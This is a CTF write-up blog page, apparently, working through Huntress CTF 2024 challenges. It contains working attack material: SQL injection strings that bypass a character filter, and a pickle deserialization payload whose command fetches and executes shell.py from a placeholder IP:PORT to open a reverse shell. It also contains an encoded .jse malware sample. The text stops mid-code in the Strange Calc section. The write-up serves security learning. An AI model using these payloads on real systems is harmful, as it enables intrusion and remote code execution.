@@ -1,0 +1,396 @@
+<!DOCTYPE html>
+<html lang="en-us">
+
+<head>
+    <title>
+Huntress2024 | XeroExecute Blog
+</title>
+
+    <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="">
+<link rel="stylesheet" href="/css/syntax.css">
+
+<meta name="generator" content="Hugo 0.147.2">
+
+
+<link rel="canonical" href="https://XeroExecute.github.io/posts/huntress2024/" >
+
+
+
+
+<link href="/css/style.min.9a2b65a89f4b739d182c3eee1059252ff56c1ba33d40d97d6f7f4c6e35c2b476.css" rel="stylesheet">
+
+
+
+
+</head>
+
+<body>
+
+    <div class="flexWrapper">
+        <header class="headerWrapper">
+    <div class="header">
+        <div>
+            <a class="terminal" href="https://XeroExecute.github.io/">
+                <span>blog@XeroExecute.github.io ~ $</span>
+            </a>
+        </div>
+        <input class="side-menu" type="checkbox" id="side-menu">
+        <label class="hamb" for="side-menu"><span class="hamb-line"></span></label>
+        <nav class="headerLinks">
+            <ul>
+                
+                <li>
+                    <a href="https://XeroExecute.github.io/posts" title="" >
+                        ~/posts</a>
+                </li>
+                
+            </ul>
+        </nav>
+    </div>
+</header>
+
+
+        <div class="content">
+            <main class="main">
+                
+<div class="postWrapper">
+    <h1>Huntress2024</h1>
+    
+    
+    <section class="postMetadata">
+        <dl>
+            
+                
+<dt>tags</dt>
+<dd><span></span>
+    <a href="/tags/web/">#Web</a><span></span>
+    <a href="/tags/re/">#Re</a><span></span>
+    <a href="/tags/ctf/">#Ctf</a><span></span>
+    <a href="/tags/malware/">#Malware</a></dd>
+            
+            
+            
+            
+                <dt>published</dt>
+                
+                <dd><time datetime="2024-10-31">October 31, 2024</time></dd>
+            
+            
+                <dt>reading time</dt>
+                <dd>15 minutes</dd>
+            
+        </dl>
+    </section>
+    
+    
+    <aside class="toc-container">
+        <h2>Table of Contents</h2>
+        <nav id="TableOfContents">
+  <ul>
+    <li><a href="#whamazon-solution">Whamazon Solution</a>
+      <ul>
+        <li><a href="#alternative-solution">Alternative Solution</a></li>
+      </ul>
+    </li>
+  </ul>
+
+  <ul>
+    <li><a href="#keyboard-junkie-solution">Keyboard Junkie Solution</a></li>
+  </ul>
+
+  <ul>
+    <li><a href="#moveable-solution">MOVEable Solution</a></li>
+  </ul>
+
+  <ul>
+    <li><a href="#strange-calc-solution">Strange Calc Solution</a>
+      <ul>
+        <li><a href="#alternative-solution-1">Alternative Solution</a></li>
+      </ul>
+    </li>
+  </ul>
+
+  <ul>
+    <li><a href="#oceanlocust-solution">OceanLocust Solution</a></li>
+  </ul>
+</nav>
+    </aside>
+    
+    <div>
+        <p>My notes on five challenges from Huntress CTF 2024: Whamazon, Keyboard Junkie, MOVEable, Strange Calc and OceanLocust. The challenges were solved as part of the Dombusters team.</p>
+<hr>
+<h1 id="whamazon">Whamazon</h1>
+<p><strong>Challenge</strong> Author: @JohnHammond<br>
+<strong>Tagline</strong> <em>“Wham! Bam! Amazon is entering the hacking business! Can you buy a flag?”</em></p>
+<h2 id="whamazon-solution">Whamazon Solution</h2>
+<p>In this challenge, we&rsquo;re presented with a web application that can be accessed through our internet browser. Upon exploring the webapp, we find two major functionalities - viewing our empty inventory and purchasing items. Among the items for sale are some intriguing items like apples and, notably, the flag we&rsquo;re after. Unfortunately, the flag carries quite a hefty price tag, and we only start with a $50 budget with no option to sell items back.</p>
+<p>Intercepting the webapp&rsquo;s request traffic with Burp, we observe the use of a websocket. The intercepted traffic consists mainly of incomprehensible text and a few integers, likely encrypted. Modifying these integers and resending the request results in the disconnection of our websocket session.</p>
+<p>As there appears to be no direct means of manipulating an item&rsquo;s price, our next strategy involves attempting to buy a negative quantity of apples - and voila!<br>
+This little trick adds the cost of these negative apples to our balance.<br>
+<img src="/Whamazon.png" alt="Whamazon"></p>
+<p>After managing to afford and purchase the flag, we are led into a game of rock-paper-scissors against a Whamazon bot. Interestingly, the bot seems to consistently choose the same move, allowing us to finally claim our flag listed in the inventory.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">We</span> <span class="n">got</span> <span class="nb">all</span> <span class="n">the</span> <span class="n">deets</span> <span class="n">on</span> <span class="n">what</span><span class="s1">&#39;s what in your inventory:</span>
+</span></span><span class="line"><span class="cl"> <span class="o">------------------------</span> 
+</span></span><span class="line"><span class="cl">  <span class="o">-</span><span class="mi">43786587345</span> <span class="n">x</span> <span class="n">Apples</span><span class="p">:</span> <span class="n">A</span> <span class="n">shiny</span> <span class="n">red</span> <span class="n">apple</span><span class="o">.</span> <span class="n">Probably</span> <span class="n">very</span> <span class="n">tasty</span><span class="p">:</span> <span class="n">but</span> <span class="ow">not</span> <span class="nb">all</span> <span class="n">that</span> <span class="n">useful</span><span class="err">!</span>
+</span></span><span class="line"><span class="cl">  <span class="mi">1</span> <span class="n">x</span> <span class="n">The</span> <span class="n">Flag</span><span class="p">:</span> <span class="n">A</span> <span class="n">flag</span> <span class="n">you</span> <span class="n">can</span> <span class="n">submit</span> <span class="k">for</span> <span class="n">points</span> <span class="ow">in</span> <span class="n">a</span> <span class="n">CTF</span><span class="err">!</span> <span class="n">It</span> <span class="n">says</span><span class="p">:</span> <span class="n">flag</span><span class="p">{</span><span class="mi">18</span><span class="n">bdd83cee5690321bb14c70465d3408</span><span class="p">}</span>
+</span></span></code></pre></div><p>Flag: <code>flag{18bdd83cee5690321bb14c70465d3408}</code></p>
+<h3 id="alternative-solution">Alternative Solution</h3>
+<p>Interestingly, an alternate solution exists for obtaining the flag. We can cause a crash in the Python application that&rsquo;s behind the scenes of the webshop, which would subsequently allow us to gain an interactive shell within the associated Docker container.</p>
+<p>This can be achieved by repeatedly interrupting the program using the <code>CTRL-C</code> command and refreshing the page every time the connection is severed. After several attempts, a stacktrace becomes visible, and normal OS commands can be run inside the shell.<br>
+<img src="/Whamazon_Shell.png" alt="Whamazon_Shell"></p>
+<hr>
+<h1 id="keyboard-junkie">Keyboard Junkie</h1>
+<p><strong>Challenge</strong> Author: @JohnHammond<br>
+<strong>Tagline</strong> <em>“My friend wouldn&rsquo;t shut up about his new keyboard, so&hellip;”</em></p>
+<h2 id="keyboard-junkie-solution">Keyboard Junkie Solution</h2>
+<p>The challenge provided a <code>.pcap</code> file with numerous USB-related packets. Suspecting that these packets might contain keyboard press data, I sought a tool that could parse this information.</p>
+<p>The tool I opted for was the ctf-usb-keyboard-parser.<br>
+<a href="https://github.com/TeamRocketIst/ctf-usb-keyboard-parser">https://github.com/TeamRocketIst/ctf-usb-keyboard-parser</a></p>
+<p>According to the tool&rsquo;s readme file, the first step is to filter out the pertinent packets from the entire packet capture file and store them in a new .pcap file.<br>
+This can be done using the following command:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">tshark -r ./keyboard_junkie -Y <span class="s1">&#39;usb.capdata &amp;&amp; usb.data_len == 8&#39;</span> -T fields -e usb.capdata <span class="p">|</span> sed <span class="s1">&#39;s/../:&amp;/g2&#39;</span> &gt; keyboard.pcap
+</span></span></code></pre></div><p>Following this, we then use our tool to interpret what was typed.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">python3</span> <span class="n">usbkeyboard</span><span class="o">.</span><span class="n">py</span> <span class="n">keyboard</span><span class="o">.</span><span class="n">pcap</span>
+</span></span><span class="line"><span class="cl"><span class="n">so</span> <span class="n">the</span> <span class="n">answer</span> <span class="ow">is</span> <span class="n">flag</span><span class="p">{</span><span class="n">f7733e0093b7d281dd0a30fcf34a9634</span><span class="p">}</span> <span class="n">hahahah</span> <span class="n">lol</span>
+</span></span></code></pre></div><p>That gives us our flag.</p>
+<p>Flag: <code>flag{f7733e0093b7d281dd0a30fcf34a9634}</code></p>
+<hr>
+<h1 id="moveable">MOVEable</h1>
+<p><strong>Challenge</strong> Author: @JohnHammond#6971<br>
+<strong>Tagline</strong> <em>“Ever wanted to move your files? You know, like with a fancy web based GUI instead of just FTP or something? Escalate your privileges and find the flag.”</em></p>
+<h2 id="moveable-solution">MOVEable Solution</h2>
+<p>This challenge was quite fun to solve, with each step of exploitation becoming clear after a bit of searching. However, let&rsquo;s not rush things and rather examine how the challenge can be solved step by step.</p>
+<p>We are provided with the app.py for a Flask application. This app displays a login page and utilizes an SQLlite database to store user information. Furthermore, there are tables for sessions and files that are stored within this web application.</p>
+<p>The login function immediately reveals that the SQL statement for login seems susceptible to SQL injection. Below is the mentioned code segment:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">username</span> <span class="o">=</span> <span class="n">DBClean</span><span class="p">(</span><span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl"><span class="n">password</span> <span class="o">=</span> <span class="n">DBClean</span><span class="p">(</span><span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="p">[</span><span class="s1">&#39;password&#39;</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl"><span class="n">conn</span> <span class="o">=</span> <span class="n">get_db</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">c</span> <span class="o">=</span> <span class="n">conn</span><span class="o">.</span><span class="n">cursor</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">sql</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&#34;SELECT * FROM users WHERE username=&#39;</span><span class="si">{</span><span class="n">username</span><span class="si">}</span><span class="s2">&#39; AND password=&#39;</span><span class="si">{</span><span class="n">password</span><span class="si">}</span><span class="s2">&#39;&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">c</span><span class="o">.</span><span class="n">executescript</span><span class="p">(</span><span class="n">sql</span><span class="p">)</span>
+</span></span></code></pre></div><p>However, before being used in the SQL statement, our parameters are &ldquo;cleaned&rdquo; in the <code>DBClean</code> function.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">DBClean</span><span class="p">(</span><span class="n">string</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">bad_char</span> <span class="ow">in</span> <span class="s2">&#34; &#39;</span><span class="se">\&#34;</span><span class="s2">&#34;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">string</span> <span class="o">=</span> <span class="n">string</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="n">bad_char</span><span class="p">,</span><span class="s2">&#34;&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">string</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\\</span><span class="s2">&#34;</span><span class="p">,</span> <span class="s2">&#34;&#39;&#34;</span><span class="p">)</span>
+</span></span></code></pre></div><p>The function removes the characters <code> </code>, <code>'</code> and <code>&quot;</code>. Yet, there is an additional replacement that substitutes <code>\</code> with <code>'</code>, implying that we can still use <code>'</code>, if we type <code>\</code> instead.</p>
+<p>For bypassing the removal of the space character <code> </code>, a simple bypass of <code>/**/</code> can be used. As a result, we can now execute almost any SQL command.</p>
+<p>The remainder of the login function indicates that we need an existing user returned from the SQL statement for a successful login.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">user</span> <span class="o">=</span> <span class="n">c</span><span class="o">.</span><span class="n">fetchone</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="n">user</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">c</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;SELECT sessionid FROM activesessions WHERE username=?&#34;</span><span class="p">,</span> <span class="p">(</span><span class="n">username</span><span class="p">,))</span>
+</span></span><span class="line"><span class="cl">    <span class="n">active_session</span> <span class="o">=</span> <span class="n">c</span><span class="o">.</span><span class="n">fetchone</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">active_session</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">session_id</span> <span class="o">=</span> <span class="n">active_session</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">c</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;SELECT username FROM users WHERE username=?&#34;</span><span class="p">,</span> <span class="p">(</span><span class="n">username</span><span class="p">,))</span>
+</span></span><span class="line"><span class="cl">        <span class="n">user_name</span> <span class="o">=</span> <span class="n">c</span><span class="o">.</span><span class="n">fetchone</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">user_name</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">session_id</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">uuid</span><span class="o">.</span><span class="n">uuid4</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl">            <span class="n">c</span><span class="o">.</span><span class="n">executescript</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;INSERT INTO activesessions (sessionid, timestamp) VALUES (&#39;</span><span class="si">{</span><span class="n">session_id</span><span class="si">}</span><span class="s2">&#39;, &#39;</span><span class="si">{</span><span class="n">datetime</span><span class="o">.</span><span class="n">now</span><span class="p">()</span><span class="o">.</span><span class="n">strftime</span><span class="p">(</span><span class="s1">&#39;%Y-%m-</span><span class="si">%d</span><span class="s1"> %H:%M:%S.</span><span class="si">%f</span><span class="s1">&#39;</span><span class="p">)</span><span class="si">}</span><span class="s2">&#39;)&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">flash</span><span class="p">(</span><span class="s2">&#34;A session could be not be created&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">logout</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">session</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="n">username</span>
+</span></span><span class="line"><span class="cl">    <span class="n">session</span><span class="p">[</span><span class="s1">&#39;session_id&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="n">session_id</span>
+</span></span><span class="line"><span class="cl">    <span class="n">conn</span><span class="o">.</span><span class="n">commit</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="n">url_for</span><span class="p">(</span><span class="s1">&#39;files&#39;</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">flash</span><span class="p">(</span><span class="s1">&#39;Username or password is incorrect&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="n">url_for</span><span class="p">(</span><span class="s1">&#39;home&#39;</span><span class="p">))</span>
+</span></span></code></pre></div><p>Given the ability to inject additional SQL commands, we can insert any user of our choosing into the users table. For example a user called <code>admin1</code> with the following statement:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="n">admin1</span><span class="err">\</span><span class="p">;</span><span class="cm">/**/</span><span class="k">INSERT</span><span class="cm">/**/</span><span class="k">INTO</span><span class="cm">/**/</span><span class="n">users</span><span class="cm">/**/</span><span class="k">VALUES</span><span class="cm">/**/</span><span class="p">(</span><span class="err">\</span><span class="n">admin1</span><span class="err">\</span><span class="p">,</span><span class="err">\</span><span class="n">admin1</span><span class="err">\</span><span class="p">)</span><span class="c1">--
+</span></span></span></code></pre></div><p>Even though our local setup confirms that this user is indeed created in the users table, we are still unable to log in. Debugging on the locally deployed web app of the MOVEable app.py reveals that the user variable remains persistently <code>None</code>. This is due to the app&rsquo;s utilization of <code>executescript()</code>, which returns nothing. Therefore we will never be able to login that way.</p>
+<p>Next, we need to explore alternative methods for authentication and exploitation of this web application. For this, we&rsquo;ll look at the remaining functions in the Python code.</p>
+<p>There&rsquo;s a <code>download_file</code> function that allows us to download files. Interestingly, this route doesn&rsquo;t check our authentication credentials but fetches the session ID directly from the URL. It then verifies the existence of this session ID in the activesessions database table and proceeds to download the requested file. Below is the snippet of that function:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/download/&lt;filename&gt;/&lt;sessionid&gt;&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;GET&#39;</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">download_file</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="n">sessionid</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">conn</span> <span class="o">=</span> <span class="n">get_db</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="n">c</span> <span class="o">=</span> <span class="n">conn</span><span class="o">.</span><span class="n">cursor</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="n">c</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;SELECT * FROM activesessions WHERE sessionid=?&#34;</span><span class="p">,</span> <span class="p">(</span><span class="n">sessionid</span><span class="p">,))</span>
+</span></span><span class="line"><span class="cl">    <span class="n">active_session</span> <span class="o">=</span> <span class="n">c</span><span class="o">.</span><span class="n">fetchone</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">active_session</span> <span class="ow">is</span> <span class="kc">None</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">flash</span><span class="p">(</span><span class="s1">&#39;No active session found&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="n">url_for</span><span class="p">(</span><span class="s1">&#39;home&#39;</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">    <span class="n">c</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;SELECT data FROM files WHERE filename=?&#34;</span><span class="p">,(</span><span class="n">filename</span><span class="p">,))</span>
+</span></span><span class="line"><span class="cl">    <span class="n">file_data</span> <span class="o">=</span> <span class="n">c</span><span class="o">.</span><span class="n">fetchone</span><span class="p">()</span>
+</span></span></code></pre></div><p>Given that we can insert any statement into the database, it&rsquo;s possible to craft ourselves a valid session ID. All we need to do is modify the SQL injection slightly so that it writes a session instead of a user:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="n">admin1</span><span class="err">\</span><span class="p">;</span><span class="cm">/**/</span><span class="k">INSERT</span><span class="cm">/**/</span><span class="k">INTO</span><span class="cm">/**/</span><span class="n">activesessions</span><span class="cm">/**/</span><span class="k">VALUES</span><span class="cm">/**/</span><span class="p">(</span><span class="err">\</span><span class="mi">8</span><span class="n">de16447</span><span class="o">-</span><span class="n">c339</span><span class="o">-</span><span class="mi">41</span><span class="n">c4</span><span class="o">-</span><span class="n">be6f</span><span class="o">-</span><span class="n">eaf3db51a661</span><span class="err">\</span><span class="p">,</span><span class="err">\</span><span class="n">admin1</span><span class="err">\</span><span class="p">,</span><span class="err">\</span><span class="mi">2024</span><span class="o">-</span><span class="mi">10</span><span class="o">-</span><span class="mi">17</span><span class="w"> </span><span class="mi">22</span><span class="p">:</span><span class="mi">14</span><span class="p">:</span><span class="mi">53</span><span class="p">.</span><span class="mi">757220</span><span class="err">\</span><span class="p">);</span><span class="c1">--
+</span></span></span></code></pre></div><p>This will allow us to read the files stored in the database, including flag.txt, which unfortunately contains a dummy text instead of a flag:</p>
+<blockquote>
+<p>lol just kidding this isn&rsquo;t really where the flag is</p></blockquote>
+<p>This mock flag was expected, as it&rsquo;s also inserted into the db within the app.py code. One might hope that the actual live instance would provide the real flag, but that isn&rsquo;t the case.</p>
+<p>Next, looking further into the same function&rsquo;s code, we notice that <code>pickle</code> is utilized to load file content from base64.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl">    <span class="n">file_data</span> <span class="o">=</span> <span class="n">c</span><span class="o">.</span><span class="n">fetchone</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">file_data</span> <span class="ow">is</span> <span class="kc">None</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">flash</span><span class="p">(</span><span class="s1">&#39;File not found&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="n">url_for</span><span class="p">(</span><span class="s1">&#39;files&#39;</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">    <span class="n">file_blob</span> <span class="o">=</span> <span class="n">pickle</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">file_data</span><span class="p">[</span><span class="mi">0</span><span class="p">]))</span>
+</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>    
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">send_file</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">BytesIO</span><span class="p">(</span><span class="n">file_blob</span><span class="p">),</span> <span class="n">download_name</span><span class="o">=</span><span class="n">filename</span><span class="p">,</span> <span class="n">as_attachment</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">except</span> <span class="ne">TypeError</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">flash</span><span class="p">(</span><span class="s2">&#34;ERROR: Failed to retrieve file. Are you trying to hack us?!?&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="n">url_for</span><span class="p">(</span><span class="s1">&#39;files&#39;</span><span class="p">))</span>
+</span></span></code></pre></div><p>Google reveals that pickle has some serious vulnerabilities that we might exploit to execute commands on the server.</p>
+<p>In Python, the pickle module is used to serialize and deserialize data. In this case, deserialization can also lead to remote code execution. More details can be found <a href="https://github.com/CalfCrusher/Python-Pickle-RCE-Exploit/tree/main">here (Python-Pickle-RCE-Exploit)</a> and <a href="https://davidhamann.de/2020/04/05/exploiting-python-pickle/">here (exploiting-python-pickle)</a>.</p>
+<p>Let&rsquo;s try to insert our own file into the third and last table of our database, one we haven&rsquo;t inserted anything into so far.</p>
+<p>To generate the file content, we can use the following pickle payload generation script:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">pickle</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">base64</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">sys</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">PickleRCE</span><span class="p">(</span><span class="nb">object</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">__reduce__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="kn">import</span> <span class="nn">os</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">,(</span><span class="s1">&#39;python3 -c &#34;import urllib.request; exec(urllib.request.urlopen(</span><span class="se">\\</span><span class="s1">&#34;http://IP:PORT/shell.py</span><span class="se">\\</span><span class="s1">&#34;).read())&#34; IP PORT&#39;</span><span class="p">,))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">pickle</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">PickleRCE</span><span class="p">()))</span>  <span class="c1"># Crafting Payload</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span></span></code></pre></div><p>We then need to utilize the base64 output as file content in our insertion into the files table.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="n">username</span><span class="o">=</span><span class="k">admin</span><span class="o">&amp;</span><span class="n">password</span><span class="o">=</span><span class="k">admin</span><span class="err">\</span><span class="p">;</span><span class="k">INSERT</span><span class="cm">/**/</span><span class="k">INTO</span><span class="cm">/**/</span><span class="n">files</span><span class="cm">/**/</span><span class="k">VALUES</span><span class="cm">/**/</span><span class="p">(</span><span class="err">\</span><span class="n">pwned</span><span class="p">.</span><span class="n">txt</span><span class="err">\</span><span class="p">,</span><span class="err">\</span><span class="n">BASE64_HERE</span><span class="err">\</span><span class="p">,</span><span class="k">NULL</span><span class="p">)</span><span class="c1">--%20-
+</span></span></span></code></pre></div><p>The final step of the execution chain is to trigger the script. Of course, the <code>shell.py</code> needs to be downloadable by the hosted instance of the challenge, so the reverse shell can be downloaded from the Python script and executed. Moreover, the script then requires a way to connect back to your listener.</p>
+<p>After the callback from the reverse shell, you were successfully able to access the root directory and read the flag. By using the command:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo cat /root/flag.txt
+</span></span></code></pre></div><hr>
+<h1 id="strange-calc">Strange Calc</h1>
+<p><strong>Challenge</strong> Author: @JohnHammond<br>
+<strong>Tagline</strong> <em>“I got this new calculator app from my friend! But it&rsquo;s really weird, for some reason it needs admin permissions to run??”</em></p>
+<h2 id="strange-calc-solution">Strange Calc Solution</h2>
+<p>Our team had two main ways to beat this task. I&rsquo;ll start with the easy one: using a sandbox. Obviously it was a private sandbox instance so the challenge wouldn&rsquo;t be leaked.</p>
+<p>When looking at the process tree, we saw some unusual net commands happening. Normal calculators shouldn&rsquo;t do this. All this seemed to connect to a file named &ldquo;WmZ93kfDVH.jse&rdquo;. We don&rsquo;t know where this file came from, but it looks like the calculator process (calc.exe) is executing it.</p>
+<p><img src="/Strange_Calc_Process.png" alt="Process tree"></p>
+<p>Lucky for us the sandbox has a feature to download files that were created during execution. So we can directly download the .jse file without having to extract it ourself from the calc.exe.<br>
+Looking at the content of that file its just some binary garbage.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1">#@~^cQMAAA==W!x^DkKxPm`(b	7l.P1&#39;EEBN&#39;( /aVkDcE-	J*iWW.c7l.Px!p+@![cV+ULDtI+3Q*	-mD,0&#39;9$DRM+2VmmncJ7-kQu&#39;/_f&amp;L~EB*ir0cWckUNar6`E8okUE*&#39;x&#39;Zk-0 bx9+6}0vENE#{&#39;xT-u0{x&#39;rJ#1GUYbx!+I\C.,ox`6 m4l./KN+)Ov!bO2+*[2i6WDv\m.P4&#39;qi4@!W ^+xTOtpt_{*b	b0vtQ&amp;@*x6Rs+	LY4#8.l3I-mD~k{c6R^4lMZW9+zO`4#R&amp;y#&#39;2~L{c0cmtm./W9+zYctQq*Of *&#39;v2~Vxv0R^4mD/W9nzYc4_y#O2 *&#39;v2~s&#39;v0 ^4lD;GNbYv4Q&amp;*O2 b[fpmQ&#39;UODbxL 6DWh/4l.ZK[`cb@!@! #-`N@*@*W#bib0c43 @!6 VxoD4RF*m3&#39;jY.r	o 0MG:;tC.;WNncv`%[8X*@!@!W#-`3@*@*yb#pkW`4_f@!6RVUoDtO8b^_{?DDrxL 6DG:;4lMZ</span>
+</span></span></code></pre></div><p>But the search for the file extension <code>.jse</code> reveals that it&rsquo;s a dialect of JavaScript developed by Microsoft.<br>
+So let&rsquo;s see how we can decode it. Luckily, most of the time we can use CyberChef to help us. To read it, we use the recipe called Microsoft Script Decoder. You can also go directly to it by using this <a href="https://gchq.github.io/CyberChef/#recipe=Microsoft_Script_Decoder()JavaScript_Beautify('%5C%5Ct','Auto',true,true)">link</a>.</p>
+<p>With this, we get the following JavaScript that we can understand, so we can keep analysing it.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">function</span> <span class="nf">a</span><span class="p">(</span><span class="n">b</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="n">var</span> <span class="n">c</span> <span class="o">=</span> <span class="err">&#39;&#39;</span><span class="p">,</span> <span class="n">d</span> <span class="o">=</span> <span class="n">b</span><span class="p">.</span><span class="nf">split</span><span class="p">(</span><span class="sc">&#39;\n&#39;</span><span class="p">);</span>
